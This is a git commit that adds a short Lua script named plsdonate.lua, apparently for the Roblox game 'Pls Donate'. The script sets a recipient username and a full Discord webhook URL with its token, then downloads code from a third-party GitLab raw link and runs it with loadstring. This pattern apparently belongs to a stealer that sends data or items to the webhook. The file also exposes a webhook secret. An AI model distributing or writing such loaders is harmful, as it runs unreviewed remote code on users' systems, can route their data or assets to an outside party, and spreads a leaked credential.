19bd2ab02bd13e1998f03a28cd49e677da520fb2
alonehub31 <fisayev353@gmail.com>
2025-07-29 20:09:27 +0400

    Create plsdonate.lua

---
+++ plsdonate.lua
@@ -0,0 +1,4 @@
+Username = "im_kiddd8"
+Webhook = "https://discord.com/api/webhooks/1386030460500709508/YipegTnJW1kp8NsimzJ3PcxcX02R8KKBNLmq8-DeveZoEg-8Oa478Qv4xbo5yZXxm65k"
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/pls-donate"))()
